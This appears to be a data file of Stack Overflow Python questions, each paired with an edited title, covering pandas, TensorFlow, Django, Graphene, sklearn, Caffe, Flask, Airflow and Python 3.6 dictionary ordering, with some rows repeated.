cannot import name 'get_all_posts'",How to import a function from a module in the same folder?
PyAutoGUi : How to know if the left mouse click is pressed," I am using PyAutoGUI library. How can I know if the left mouse button is pressed?This is what I want to do:  <code>  if(leftmousebuttonpressed): print(""left"")else: print(""nothing"")",How to know if the left mouse click is pressed
TensorFlow: TypeError: argument of type 'float' is not iterable," I am new to python and TensorFlow. I recently started understanding and executing TensorFlow examples, and came across this one: https://www.tensorflow.org/versions/r0.10/tutorials/wide_and_deep/index.htmlI got the error, TypeError: argument of type 'float' is not iterable, and I believe that the problem is with the following line of code: (income_bracket is the label column of the census dataset, with '>50K' being one of the possible label values, and the other label is '=<50K'. The dataset is read into df_train. The explanation provided in the documentation for the reason to do the above is, ""Since the task is a binary classification problem, we'll construct a label column named ""label"" whose value is 1 if the income is over 50K, and 0 otherwise."")If anyone could explain me what is exactly happening and how should I fix it, that'll be great. I tried using Python2.7 and Python3.4, and I don't think that the problem is with the version of the language. Also, if anyone is aware of great tutorials for someone who is new to TensorFlow and pandas, please share the links.Complete program: Thank youPS: Full stack trace for the error <code>  df_train[LABEL_COLUMN] = (df_train['income_bracket'].apply(lambda x: '>50K' in x)).astype(int) import pandas as pdimport urllibimport tempfileimport tensorflow as tfgender = tf.contrib.layers.sparse_column_with_keys(column_name=""gender"", keys=[""female"", ""male""])race = tf.contrib.layers.sparse_column_with_keys(column_name=""race"", keys=[""Amer-Indian-Eskimo"", ""Asian-Pac-Islander"", ""Black"", ""Other"", ""White""])education = tf.contrib.layers.sparse_column_with_hash_bucket(""education"", hash_bucket_size=1000)marital_status = tf.contrib.layers.sparse_column_with_hash_bucket(""marital_status"", hash_bucket_size=100)relationship = tf.contrib.layers.sparse_column_with_hash_bucket(""relationship"", hash_bucket_size=100)workclass = tf.contrib.layers.sparse_column_with_hash_bucket(""workclass"", hash_bucket_size=100)occupation = tf.contrib.layers.sparse_column_with_hash_bucket(""occupation"", hash_bucket_size=1000)native_country = tf.contrib.layers.sparse_column_with_hash_bucket(""native_country"", hash_bucket_size=1000)age = tf.contrib.layers.real_valued_column(""age"")age_buckets = tf.contrib.layers.bucketized_column(age, boundaries=[18, 25, 30, 35, 40, 45, 50, 55, 60, 65])education_num = tf.contrib.layers.real_valued_column(""education_num"")capital_gain = tf.contrib.layers.real_valued_column(""capital_gain"")capital_loss = tf.contrib.layers.real_valued_column(""capital_loss"")hours_per_week = tf.contrib.layers.real_valued_column(""hours_per_week"")wide_columns = [gender, native_country, education, occupation, workclass, marital_status, relationship, age_buckets, tf.contrib.layers.crossed_column([education, occupation], hash_bucket_size=int(1e4)), tf.contrib.layers.crossed_column([native_country, occupation], hash_bucket_size=int(1e4)), tf.contrib.layers.crossed_column([age_buckets, race, occupation], hash_bucket_size=int(1e6))]deep_columns = [ tf.contrib.layers.embedding_column(workclass, dimension=8), tf.contrib.layers.embedding_column(education, dimension=8), tf.contrib.layers.embedding_column(marital_status, dimension=8), tf.contrib.layers.embedding_column(gender, dimension=8), tf.contrib.layers.embedding_column(relationship, dimension=8), tf.contrib.layers.embedding_column(race, dimension=8), tf.contrib.layers.embedding_column(native_country, dimension=8), tf.contrib.layers.embedding_column(occupation, dimension=8), age, education_num, capital_gain, capital_loss, hours_per_week]model_dir = tempfile.mkdtemp()m = tf.contrib.learn.DNNLinearCombinedClassifier( model_dir=model_dir, linear_feature_columns=wide_columns, dnn_feature_columns=deep_columns, dnn_hidden_units=[100, 50])COLUMNS = [""age"", ""workclass"", ""fnlwgt"", ""education"", ""education_num"", ""marital_status"", ""occupation"", ""relationship"", ""race"", ""gender"", ""capital_gain"", ""capital_loss"", ""hours_per_week"", ""native_country"", ""income_bracket""]LABEL_COLUMN = 'label'CATEGORICAL_COLUMNS = [""workclass"", ""education"", ""marital_status"", ""occupation"", ""relationship"", ""race"", ""gender"", ""native_country""]CONTINUOUS_COLUMNS = [""age"", ""education_num"", ""capital_gain"", ""capital_loss"", ""hours_per_week""]train_file = tempfile.NamedTemporaryFile()test_file = tempfile.NamedTemporaryFile()urllib.urlretrieve(""https://archive.ics.uci.edu/ml/machine-learning-databases/adult/adult.data"", train_file.name)urllib.urlretrieve(""https://archive.ics.uci.edu/ml/machine-learning-databases/adult/adult.test"", test_file.name)df_train = pd.read_csv(train_file, names=COLUMNS, skipinitialspace=True)df_test = pd.read_csv(test_file, names=COLUMNS, skipinitialspace=True, skiprows=1)df_train[LABEL_COLUMN] = (df_train['income_bracket'].apply(lambda x: '>50K' in x)).astype(int)df_test[LABEL_COLUMN] = (df_test['income_bracket'].apply(lambda x: '>50K' in x)).astype(int)def input_fn(df): continuous_cols = {k: tf.constant(df[k].values) for k in CONTINUOUS_COLUMNS} categorical_cols = {k: tf.SparseTensor( indices=[[i, 0] for i in range(df[k].size)], values=df[k].values, shape=[df[k].size, 1]) for k in CATEGORICAL_COLUMNS} feature_cols = dict(continuous_cols.items() + categorical_cols.items()) label = tf.constant(df[LABEL_COLUMN].values) return feature_cols, labeldef train_input_fn(): return input_fn(df_train)def eval_input_fn(): return input_fn(df_test)m.fit(input_fn=train_input_fn, steps=200)results = m.evaluate(input_fn=eval_input_fn, steps=1)for key in sorted(results): print(""%s: %s"" % (key, results[key])) Traceback (most recent call last): File ""/home/jaspreet/PycharmProjects/TicTacTensorFlow/census.py"", line 73, in <module> df_train[LABEL_COLUMN] = (df_train['income_bracket'].apply(lambda x: '>50K' in x)).astype(int) File ""/usr/lib/python2.7/dist-packages/pandas/core/series.py"", line 2023, in apply mapped = lib.map_infer(values, f, convert=convert_dtype) File ""inference.pyx"", line 920, in pandas.lib.map_infer (pandas/lib.c:44780) File ""/home/jaspreet/PycharmProjects/TicTacTensorFlow/census.py"", line 73, in <lambda> df_train[LABEL_COLUMN] = (df_train['income_bracket'].apply(lambda x: '>50K' in x)).astype(int)TypeError: argument of type 'float' is not iterable",TypeError: argument of type 'float' is not iterable
Pandas Dataframe Plot: Show random markers," I often have dataframes with many obervations and want to have a quick glance at the data using a line plot.The problem is that the colors of the colormap are either repeated over X observations or hard to distinguish e.g. in case of sequential colormaps.So my idea was to add random markers to the line plot which is where I got stuck.Here's an example with one markerstyle: which delivers:Is it also possible to draw a (random) marker for each line?Thanks in advance! <code>  # -*- coding: utf-8 -*-import pandas as pdimport numpy as npimport matplotlib.pyplot as plt# dataframe with random datadf = pd.DataFrame(np.random.rand(10, 8))# plotdf.plot(kind='line', marker='d')plt.show()",Pandas Dataframe Line Plot: Show Random Markers
Django Cache auto refresh when Data is changed," Is there any way to notify django to refresh the cache if there were any changes made on the database related to the cache data ? I have found this post, there is no latest answer and the django version mentioned was 1.6. I looked into the cache documentation and haven't found anything that directly relates to the question. My question is what if I cache a result of a database query and there are new records added in between the timeout for the cache Is there any way to check if there has been any addition to the database and the cache refresh whenever there has been addition or deletion of records from the database ? I have close to 10 tables where this might be important. Where whenever a records has been changed, the cache has to be updated.Any help or suggestions are much appreciated.Project Stack: <code>  from django.core.cache import cacheresults = MyModel.objects.all() # 4 countcache.set('results', results ) # Cached for 5 mins# Mean while records have been added to MyModel tableresults = MyModel.objects.all() # 6 countcache.get('results') # 4 count and would not be updated for 5 mins Django: 1.9Python: 3.5Redis: 2.8 (Cache Database)Postgres: 9.5 (Main Database)",Django Cache (Redis) auto refresh when data is changed
Fetch models from raw PostgreSQL query using GraphQL for Django (Graphene)," What is the best way to use GraphQL with Django when using an external database to fetch data from multiple tables (i.e., creating a Django Model to represent the data would not correspond to a single table in my database)?My approach was to temporarily abandon using Django models since I don't think I fully understand them yet. (I'm completely new to Django as well as GraphQL.) I've set up a simple project with an app with a connected external Postgres DB. I followed all the setup from the Graphene Django tutorial and then hit a road block when I realized the model I created was an amalgam of several tables.I have a query that sends back the proper columns mapped to the fields in my model, but I don't know how to make this a dynamic connection such that when my API is hit, it queries my database and maps the rows to the model schema I've defined in Django.My approach since has been to avoid models and use the simpler method demonstrated in Steven Luscher's talk: Zero to GraphQL in 30 Minutes.TLDR;The goal is to be able to hit my GraphQL endpoint, use a cursor object from my django.db.connection to get a list of dictionaries that should resolve to a GraphQLList of OrderItemTypes (see below).The problem is I am getting nulls for every value when I hit the following endpoint with a query: returns: project/main/app/schema.py In my terminal, I print from QueryType's resolve method and I can see the data successfully comes back from my Postgres connection. However, the GraphQL gives me nulls so it has to be in the resolve method that some mapping is getting screwed up. How do I properly map my data to the fields I've defined in my OrderItemType?Here are some more references:project/main/schema.py file tree <code>  localhost:8000/api?query={orderItems{date,uuid,orderId}} { ""data"":{ ""orderItems"":[ {""date"":null, ""uuid"":null, ""orderId"":null }, ... ] } } import graphenefrom django.db import connectionclass OrderItemType(graphene.ObjectType): date = graphene.core.types.custom_scalars.DateTime() order_id = graphene.ID() uuid = graphene.String()class QueryType(graphene.ObjectType): name = 'Query' order_items = graphene.List(OrderItemType) def resolve_order_items(root, args, info): data = get_order_items() # data prints out properly in my terminal print data # data does not resolve properly return datadef get_db_dicts(sql, args=None): cursor = connection.cursor() cursor.execute(sql, args) columns = [col[0] for col in cursor.description] data = [ dict(zip(columns, row)) for row in cursor.fetchall() ] cursor.close() return datadef get_order_items(): return get_db_dicts("""""" SELECT j.created_dt AS date, j.order_id, j.uuid FROM job AS j LIMIT 3; """""") [ { 'uuid': u'7584aac3-ab39-4a56-9c78-e3bb1e02dfc1', 'order_id': 25624320, 'date': datetime.datetime(2016, 1, 30, 16, 39, 40, 573400, tzinfo=<UTC>) }, ... ] import graphenefrom project.app.schema import QueryType AppQueryclass Query(AppQuery): passschema = graphene.Schema( query=Query, name='Pathfinder Schema') |-- project |-- manage.py |-- main |-- app |-- models.py |-- schema.py |-- schema.py |-- settings.py |-- urls.py",GraphQL + Django: resolve queries using raw PostgreSQL query
what is correct way of type hint a function that return only a specific set of values?," I have a function that can only return a, b or c, all of them are of type T. I want to include this fact in the signature because of the special meaning they carry in the context of the function. How do I do that?Currently, I use this Is that the correct one?I know that I can do this but as I said, I want to express in the signature that the function only returns those specific values. <code>  def fun(...) -> ""a or b or c"": #briefly explain the meaning of a, b and c in its docstring def fun(...) -> T: # briefly explain the meaning of a, b and c in its docstring",Type hint for a function that returns only a specific set of values
"Pandas: Is there a way to use drop level and in process, rename the the other level using the dropped level labels as prefixees?"," Screenshot of the query below:Is there a way to easily drop the upper level column index and a have a single level with labels such as points_prev_amax, points_prev_amin, gf_prev_amax, gf_prev_amin and so on?  <code> ","Pandas: Is there a way to use something like 'droplevel' and in process, rename the other level using the dropped level labels as prefix/suffix?"
"Pandas: Is there a way to use something like 'droplevel' and in process, rename the the other level using the dropped level labels as prefix/suffix?"," Screenshot of the query below:Is there a way to easily drop the upper level column index and a have a single level with labels such as points_prev_amax, points_prev_amin, gf_prev_amax, gf_prev_amin and so on?  <code> ","Pandas: Is there a way to use something like 'droplevel' and in process, rename the other level using the dropped level labels as prefix/suffix?"
sklearn pipline on subset of columns of X," Writing my first pipeline for sk-learn I stumbled upon some issues when only a subset of columns is put into a pipeline: I use the functionTransformer like: This results in: TypeError: 'list' object is not callable when the function transformer is enabled.edit:If I instantiate a ColumnExtractor like below no error is returned. But isn't the functionTransformer meant just for simple cases like this one and should just work? <code>  mydf = pd.DataFrame({'classLabel':[0,0,0,1,1,0,0,0], 'categorical':[7,8,9,5,7,5,6,4], 'numeric1':[7,8,9,5,7,5,6,4], 'numeric2':[7,8,9,5,7,5,6,""N.A""]})columnsNumber = ['numeric1']XoneColumn = X[columnsNumber] def extractSpecificColumn(X, columns): return X[columns]pipeline = Pipeline([ ('features', FeatureUnion([ ('continuous', Pipeline([ ('numeric', FunctionTransformer(columnsNumber)), ('scale', StandardScaler()) ])) ], n_jobs=1)), ('estimator', RandomForestClassifier(n_estimators=50, criterion='entropy', n_jobs=-1))])cv.cross_val_score(pipeline, XoneColumn, y, cv=folds, scoring=kappaScore) class ColumnExtractor(TransformerMixin): def __init__(self, columns): self.columns = columns def transform(self, X, *_): return X[self.columns] def fit(self, *_): return self",sklearn function transformer in pipeline
sklearn pipline on subset of columns of X via function transformer," Writing my first pipeline for sk-learn I stumbled upon some issues when only a subset of columns is put into a pipeline: I use the functionTransformer like: This results in: TypeError: 'list' object is not callable when the function transformer is enabled.edit:If I instantiate a ColumnExtractor like below no error is returned. But isn't the functionTransformer meant just for simple cases like this one and should just work? <code>  mydf = pd.DataFrame({'classLabel':[0,0,0,1,1,0,0,0], 'categorical':[7,8,9,5,7,5,6,4], 'numeric1':[7,8,9,5,7,5,6,4], 'numeric2':[7,8,9,5,7,5,6,""N.A""]})columnsNumber = ['numeric1']XoneColumn = X[columnsNumber] def extractSpecificColumn(X, columns): return X[columns]pipeline = Pipeline([ ('features', FeatureUnion([ ('continuous', Pipeline([ ('numeric', FunctionTransformer(columnsNumber)), ('scale', StandardScaler()) ])) ], n_jobs=1)), ('estimator', RandomForestClassifier(n_estimators=50, criterion='entropy', n_jobs=-1))])cv.cross_val_score(pipeline, XoneColumn, y, cv=folds, scoring=kappaScore) class ColumnExtractor(TransformerMixin): def __init__(self, columns): self.columns = columns def transform(self, X, *_): return X[self.columns] def fit(self, *_): return self",sklearn function transformer in pipeline
Unknown layer type in Caffe for windows," I want to use the following convolutional neural network:http://lmb.informatik.uni-freiburg.de/people/ronneber/u-net/with caffe built from https://github.com/BVLC/caffe/tree/windowsfor windows 10 with visual studio 2013, CUDA 7.5, cudNN 4 and python support.Now, when i call either of the two networks supplied with I get the following error: Line 43 of the network looks as follows: I have looked online and some people seem to encounter the same error message. I could not find any solutions, however.My question now is: how do I get rid of this error?Help is greatly appreciated!EDIT:Changing the .prototxt as suggested by Dale Song eliminated this error, but led to another one: I fixed this by replacing with in the .prototxt, as suggested here.Thanks! <code>  net = caffe.Net('xyz.prototxt', 'xyz.caffemodel', caffe.TEST) Error parsing text-format caffe.NetParameter: 43:85: Unknown enumeration value of ""CROP"" for field ""type"". layers { bottom: 'd3c' bottom: 'u3a' top: 'd3cc' name: 'crop_d3c-d3cc' type: CROP } [libprotobuf ERROR ..\src\google\protobuf\text_format.cc:274] Error parsing text-format caffe.NetParameter: 10:102: Message type ""caffe.LayerParameter"" has no field named ""blobs_lr"". blobs_lr: 1 weight_decay: 1 blobs_lr: 2 weight_decay: 0 param {lr_mult: 1 decay_mult: 1} param {lr_mult: 2 decay_mult: 0}",Unknown layer type (crop) in Caffe for windows
Can you dynamically add class variables to subclass python?," I have a large amount of auto-generated classes in python that essentially represent enums for part of a communication protocol, they look like so Defining things this way makes it easy for the auto-generator and also for humans to modify. The ParamEnum class provides all the functionality, get/setting, comparison, conversion and creation from the incoming network data and etc.However, these classes require some extra meta-data. I do not want to add this into the source definition of each class though, as it makes it less readable and will break the autogeneratorAt the moment I am doing it like this however that strikes me as somewhat inefficient, since this will happen every time we instantiate one of these Enums (which happens often), not just on definition (the metadata does not change, so it only needs to be set once)I tried added this to the bottom of the definition file, but ran into problems there too. Is there a way in python of overriding/adding functionality to when the class is defined, that can be inherited to subclasses? Ideally I'd like something like <code>  # definitions.pyclass StatusCodes(ParamEnum): Success = 1 Error = 2 UnexpectedAlpaca = 3class AlpacaType(ParamEnum): Fuzzy = 0 ReallyMean = 1# etc etc etc # param_enum.pyclass ParamEnum(object): def __init__(self): self.__class__._metadata = get_class_metadata(self.__class__) class StatusCodes(ParamEnum): Success = 1 Error = 2 UnexpectedAlpaca = 3for var in locals(): # or globals? add_metadata(var) #doesn't work because it is in the same file, modifying dict while iteratng class ParamEnum(object): def __when_class_defined__(cls): add_metadata(cls)",Can you dynamically add class attributes/variables to a subclass in python?
Reproducible build in python," I need to ship a compiled version of a python script and be able to prove (using a hash) that the compiled file is indeed the same as the original one.What we use so far is a simple: The issue is that this is not reproducible (not sure what are the fluctuating factors but 2 executions will not give us the same .pyc for the same python file) and forces us to always ship the same compiled version instead of being able to just give the build script to anyone to produce a new compiled version.Is there a way to achieve that?Thanks <code>  find . -name ""*.py"" -print0 | xargs -0 python2 -m py_compile",Reproducible builds in python
How to speed up recoding into integers," I have a large csv with two strings per row in this form: I read in the first two columns and recode the strings to integers as follows: This code is from https://stackoverflow.com/a/39419342/2179021.The code works very well but is slow when df is large. I timed each step and the result was surprising to me.pd.read_csv takes about 40 seconds. le.fit(df.values.flat) takes about 30 secondsdf = df.apply(le.transform) takes about 250 seconds.Is there any way to speed up this last step? It feels like it should be the fastest step of them all!More timings for the recoding step on a computer with 4GB of RAMThe answer below by maxymoo is fast but doesn't give the right answer. Taking the example csv from the top of the question, it translates it to: Notice that 'd' is mapped to 3 in the first column but 2 in the second.I tried the solution from https://stackoverflow.com/a/39356398/2179021 and get the following. Then I increased the dataframe size by a factor of 10. This method appears to use so much RAM trying to translate this relatively small dataframe that it crashes.I also timed LabelEncoder with the larger dataset with 10 millions rows. It runs without crashing but the fit line alone took 50 seconds. The df.apply(le.transform) step took about 80 seconds.How can I:Get something of roughly the speed of maxymoo's answer and roughly the memory usage of LabelEncoder but that gives the right answer when the dataframe has two columns. Store the mapping so that I can reuse it for different data (as in the way LabelEncoder allows me to do)? <code>  g,ka,hc,ij,ed,ii,hb,bd,di,ad,h import pandas as pddf = pd.read_csv(""test.csv"", usecols=[0,1], prefix=""ID_"", header=None)from sklearn.preprocessing import LabelEncoder# Initialize the LabelEncoder.le = LabelEncoder()le.fit(df.values.flat)# Convert to digits.df = df.apply(le.transform) 0 10 4 61 0 42 2 53 6 34 3 55 5 46 1 17 3 28 5 09 3 4 df = pd.DataFrame({'ID_0':np.random.randint(0,1000,1000000), 'ID_1':np.random.randint(0,1000,1000000)}).astype(str)df.info()memory usage: 7.6MB%timeit x = (df.stack().astype('category').cat.rename_categories(np.arange(len(df.stack().unique()))).unstack())1 loops, best of 3: 1.7 s per loop df = pd.DataFrame({'ID_0':np.random.randint(0,1000,10000000), 'ID_1':np.random.randint(0,1000,10000000)}).astype(str) df.info()memory usage: 76.3+ MB%timeit x = (df.stack().astype('category').cat.rename_categories(np.arange(len(df.stack().unique()))).unstack())MemoryError Traceback (most recent call last)",How to speed LabelEncoder up recoding a categorical variable into integers
Django order_by - force past dates to sort after present and future dates, I want to show the records near to today's date at top and then all records in the past at bottom:TodayTomorrowTomorrow + 1...YesterdayYesterday -1  <code> ,Django queryset order_by dates near today
Flask background-image not showing," My background-image works only for this template that has @app.route('/'). This works perfectly fine when: Everything works. I get this: But when I use same template with: I get this: And background-image is blank. <code>  <header class=""intro-header"" style=""background-image: url('static/img/home.jpg')""> @app.route('/')def home(): return render_template('post.html') 127.0.0.1 - - [19/Sep/2016 21:07:11] ""GET /static/img/home.jpg HTTP/1.1"" 304 @app.route('/post/')def post(): return render_template('post.html') 127.0.0.1 - - [19/Sep/2016 21:15:23] ""GET /post/static/img/home.jpg HTTP/1.1"" 404 - ",How to set background image on Flask Templates?
pandas: find percentile stats of a given column," I have a pandas data frame my_df, where I can find the mean(), median(), mode() of a given column: I am wondering is it possible to find more detailed stats such as 90 percentile? Thanks! <code>  my_df['field_A'].mean()my_df['field_A'].median()my_df['field_A'].mode()","Find mean, meadian, mode and percentile stats of a given column"
Find percentile stats of a given column," I have a pandas data frame my_df, where I can find the mean(), median(), mode() of a given column: I am wondering is it possible to find more detailed stats such as 90 percentile? Thanks! <code>  my_df['field_A'].mean()my_df['field_A'].median()my_df['field_A'].mode()","Find mean, meadian, mode and percentile stats of a given column"
Need help in understanding python slicings syntax as described in the python language reference," The following is the slicings syntax that I copied from The Python Language Reference: Per my understanding, this syntax equates to SomeMappingObj[slice_item,slice_item etc...] which again equates to something like a[0:2:1,4:7:1] and a =[i for i in range(20)]. But, I can't test this in IPython and I did not find any questions about multiple slicings. Is my interpretation about multiple slicing in python correct? What am I doing incorrectly? <code>  slicing ::= primary ""["" slice_list ""]""slice_list ::= slice_item ("","" slice_item)* ["",""]slice_item ::= expression | proper_sliceproper_slice ::= [lower_bound] "":"" [upper_bound] [ "":"" [stride] ]lower_bound ::= expressionupper_bound ::= expressionstride ::= expression In [442]: a=[i for i in range(20)]In [443]: a[0:12:2]Out[443]: [0, 2, 4, 6, 8, 10]In [444]: a[0:12:2,14:17:1]---------------------------------------------------------------------------TypeError Traceback (most recent call last)<ipython-input-444-117395d33bfd> in <module>()----> 1 a[0:12:2,14:17:1]TypeError: list indices must be integers or slices, not tuple",Understanding python slicings syntax as described in the python language reference
How to skip function execution during and logic in python?," I have multiple expensive functions that return results. I want to return a tuple of the results of all the checks if all the checks succeed. However, if one check fails I don't want to call the later checks, like the short-circuiting behavior of and. I could nest if statements, but that will get out of hand if there are a lot of checks. How can I get the short-circuit behavior of and while also storing the results for later use? This doesn't short-circuit: This is messy if there are many checks: Is there a shorter way to do this? <code>  def check_a(): # do something and return the result, # for simplicity, just make it ""A"" return ""A""def check_b(): # do something and return the result, # for simplicity, just make it ""B"" return ""B""... a = check_a()b = check_b()c = check_c()if a and b and c: return a, b, c if a: b = check_b() if b: c = check_c() if c: return a, b, c","Short-circuit evaluation like Python's ""and"" while storing results of checks"
How do I pull a recurring key from a JSON in python?," I'm new to python (and coding in general), I've gotten this far but I'm having trouble. I'm querying against a web service that returns a json file with information on every employee. I would like to pull just a couple of attributes for each employee, but I'm having some trouble.I have this script so far: The JSON that it returns looks like this... You can see that with the script I can return the name of employee in index 1. But I would like to have something more along the lines of: print j[**0 through len(j)**]['name'] so it will print out the name (and preferably the phone number too) of every employee in the json list.I'm fairly sure I'm approaching something wrong, but I need some feedback and direction. <code>  import jsonimport urllib2req = urllib2.Request('http://server.company.com/api')response = urllib2.urlopen(req)the_page = response.read()j = json.loads(the_page)print j[1]['name'] { ""name"": bill jones, ""address"": ""123 something st"", ""city"": ""somewhere"", ""state"": ""somestate"", ""zip"": ""12345"", ""phone_number"": ""800-555-1234"",},{ ""name"": jane doe, ""address"": ""456 another ave"", ""city"": ""metropolis"", ""state"": ""ny"", ""zip"": ""10001"", ""phone_number"": ""555-555-5554"",},",How do I pull a recurring key from a JSON?
Pyhton - after installing anaconda - command not found: jupyter," I have installed anaconda on my MAC laptop, and tried to run jupyter notebook to install it, but I get error jupyter command not found. <code> ",After installing anaconda - command not found: jupyter
What does it mean that a scope in Python is determined statically and used dynamically?," This is an excerpt of Python docs for Classes I'm struggling to understand:A scope is a textual region of a Python program where a namespace is directly accessible. Directly accessible here means that an unqualified reference to a name attempts to find the name in the namespace.Although scopes are determined statically, they are used dynamically.I didn't quite comprehend what the author meant by a scope from this definition, what's a textual region of a program, and what it means that scopes are statically determined and dynamically used. I have an intuitive understanding of a scope, but would love to fully appreciate the docs definition. If someone would be so kind as to elaborate what author had in mind it would be greatly appreciated. <code> ",What does it mean that a scope is determined statically and used dynamically?
Divide list's elements by type of each element," I have list with different types of data (string, int, etc.). I need to create a new list with, for example, only int elements, and another list with only string elements. How to do it? <code> ",Filter list's elements by type of each element
How to run Spark Java code in Airflow?," Hello people of the Earth!I'm using Airflow to schedule and run Spark tasks.All I found by this time is python DAGs that Airflow can manage. DAG example: The problem is I'm not good in Python code and have some tasks written in Java. My question is how to run Spark Java jar in python DAG? Or maybe there is other way yo do it? I found spark submit: http://spark.apache.org/docs/latest/submitting-applications.htmlBut I don't know how to connect everything together. Maybe someone used it before and has working example. Thank you for your time! <code>  spark_count_lines.pyimport loggingfrom airflow import DAGfrom airflow.operators import PythonOperatorfrom datetime import datetimeargs = { 'owner': 'airflow' , 'start_date': datetime(2016, 4, 17) , 'provide_context': True}dag = DAG( 'spark_count_lines' , start_date = datetime(2016, 4, 17) , schedule_interval = '@hourly' , default_args = args)def run_spark(**kwargs): import pyspark sc = pyspark.SparkContext() df = sc.textFile('file:///opt/spark/current/examples/src/main/resources/people.txt') logging.info('Number of lines in people.txt = {0}'.format(df.count())) sc.stop()t_main = PythonOperator( task_id = 'call_spark' , dag = dag , python_callable = run_spark)",How to run Spark code in Airflow?
"tox tests, use setup.py extra_require as tox dep source"," I want to use setup.py as the authority on packages to install for testing, done with extra_requires like so: Tox only appears to be capable of installing from a requirements.txt file which just implies a step of snapshotting requirements before testing (which I'm ignorant how to do automatically) or by duplicating the test dependencies into the tox file, which is all I want to avoid. One mailing list post suggested that tox.ini should be the authority on test dependencies, but I don't wish to straightjacket tox into the project that completely. <code>  setup( # ... extras_require={ 'test': ['pytest', ], },)","tox tests, use setup.py extra_require as tox deps source"
Can Python os.environ.get ever return a non-string?," In this code here, they use os.environ to get the value of an environment variable, and then immediately check to see if it is an instance of their custom classes. Is it actually possible that the value will be an instance of their custom classes? Is this dead code? <code>  value = os.environ.get(variable)...elif isinstance(value, ConfigList) or isinstance(value, ConfigTree):","Can Python ""os.environ.get"" ever return a non-string?"
how to change value of array in specific position in numpy," I have an array A: I want to change the last non-zero of each row to 0 how to write the code for any n*m numpy array?Thanks, S ;-) <code>  A = array([[1, 2, 3,4], [5,6,7,0] , [8,9,0,0]]) A = array([[1, 2, 3,0], [5,6,0,0] , [8,0,0,0]])",Set last non-zero element of each row to zero - NumPy
What are variable annotations in Python 3.6?," Python 3.6 is about to be released. PEP 494 -- Python 3.6 Release Schedule mentions the end of December, so I went through What's New in Python 3.6 to see they mention the variable annotations: PEP 484 introduced standard for type annotations of function parameters, a.k.a. type hints. This PEP adds syntax to Python for annotating the types of variables including class variables and instance variables: Just as for function annotations, the Python interpreter does not attach any particular meaning to variable annotations and only stores them in a special attribute __annotations__ of a class or module. In contrast to variable declarations in statically typed languages, the goal of annotation syntax is to provide an easy way to specify structured type metadata for third party tools and libraries via the abstract syntax tree and the __annotations__ attribute.So from what I read they are part of the type hints coming from Python 3.5, described in What are Type hints in Python 3.5.I follow the captain: str and class Starship example, but not sure about the last one: How does primes: List[int] = [] explain? Is it defining an empty list that will just allow integers? <code>  primes: List[int] = []captain: str # Note: no initial value!class Starship: stats: Dict[str, int] = {}",What are variable annotations?
Dictionaries are ordered in Python3.6," Dictionaries are ordered in Python 3.6 (under the CPython implementation at least) unlike in previous incarnations. This seems like a substantial change, but it's only a short paragraph in the documentation. It is described as a CPython implementation detail rather than a language feature, but also implies this may become standard in the future.How does the new dictionary implementation perform better than the older one while preserving element order?Here is the text from the documentation:dict() now uses a compact representation pioneered by PyPy. The memory usage of the new dict() is between 20% and 25% smaller compared to Python 3.5. PEP 468 (Preserving the order of **kwargs in a function.) is implemented by this. The order-preserving aspect of this new implementation is considered an implementation detail and should not be relied upon (this may change in the future, but it is desired to have this new dict implementation in the language for a few releases before changing the language spec to mandate order-preserving semantics for all current and future Python implementations; this also helps preserve backwards-compatibility with older versions of the language where random iteration order is still in effect, e.g. Python 3.5). (Contributed by INADA Naoki in issue 27350. Idea originally suggested by Raymond Hettinger.)Update December 2017: dicts retaining insertion order is guaranteed for Python 3.7 <code> ",Are dictionaries ordered in Python 3.6+?
Dictionaries are ordered in Python 3.6," Dictionaries are ordered in Python 3.6 (under the CPython implementation at least) unlike in previous incarnations. This seems like a substantial change, but it's only a short paragraph in the documentation. It is described as a CPython implementation detail rather than a language feature, but also implies this may become standard in the future.How does the new dictionary implementation perform better than the older one while preserving element order?Here is the text from the documentation:dict() now uses a compact representation pioneered by PyPy. The memory usage of the new dict() is between 20% and 25% smaller compared to Python 3.5. PEP 468 (Preserving the order of **kwargs in a function.) is implemented by this. The order-preserving aspect of this new implementation is considered an implementation detail and should not be relied upon (this may change in the future, but it is desired to have this new dict implementation in the language for a few releases before changing the language spec to mandate order-preserving semantics for all current and future Python implementations; this also helps preserve backwards-compatibility with older versions of the language where random iteration order is still in effect, e.g. Python 3.5). (Contributed by INADA Naoki in issue 27350. Idea originally suggested by Raymond Hettinger.)Update December 2017: dicts retaining insertion order is guaranteed for Python 3.7 <code> ",Are dictionaries ordered in Python 3.6+?
Dictionaries are implemented as ordered in Python 3.6," Dictionaries are ordered in Python 3.6 (under the CPython implementation at least) unlike in previous incarnations. This seems like a substantial change, but it's only a short paragraph in the documentation. It is described as a CPython implementation detail rather than a language feature, but also implies this may become standard in the future.How does the new dictionary implementation perform better than the older one while preserving element order?Here is the text from the documentation:dict() now uses a compact representation pioneered by PyPy. The memory usage of the new dict() is between 20% and 25% smaller compared to Python 3.5. PEP 468 (Preserving the order of **kwargs in a function.) is implemented by this. The order-preserving aspect of this new implementation is considered an implementation detail and should not be relied upon (this may change in the future, but it is desired to have this new dict implementation in the language for a few releases before changing the language spec to mandate order-preserving semantics for all current and future Python implementations; this also helps preserve backwards-compatibility with older versions of the language where random iteration order is still in effect, e.g. Python 3.5). (Contributed by INADA Naoki in issue 27350. Idea originally suggested by Raymond Hettinger.)Update December 2017: dicts retaining insertion order is guaranteed for Python 3.7 <code> ",Are dictionaries ordered in Python 3.6+?
Dictionaries are implemented as ordered in CPython 3.6," Dictionaries are ordered in Python 3.6 (under the CPython implementation at least) unlike in previous incarnations. This seems like a substantial change, but it's only a short paragraph in the documentation. It is described as a CPython implementation detail rather than a language feature, but also implies this may become standard in the future.How does the new dictionary implementation perform better than the older one while preserving element order?Here is the text from the documentation:dict() now uses a compact representation pioneered by PyPy. The memory usage of the new dict() is between 20% and 25% smaller compared to Python 3.5. PEP 468 (Preserving the order of **kwargs in a function.) is implemented by this. The order-preserving aspect of this new implementation is considered an implementation detail and should not be relied upon (this may change in the future, but it is desired to have this new dict implementation in the language for a few releases before changing the language spec to mandate order-preserving semantics for all current and future Python implementations; this also helps preserve backwards-compatibility with older versions of the language where random iteration order is still in effect, e.g. Python 3.5). (Contributed by INADA Naoki in issue 27350. Idea originally suggested by Raymond Hettinger.)Update December 2017: dicts retaining insertion order is guaranteed for Python 3.7 <code> ",Are dictionaries ordered in Python 3.6+?
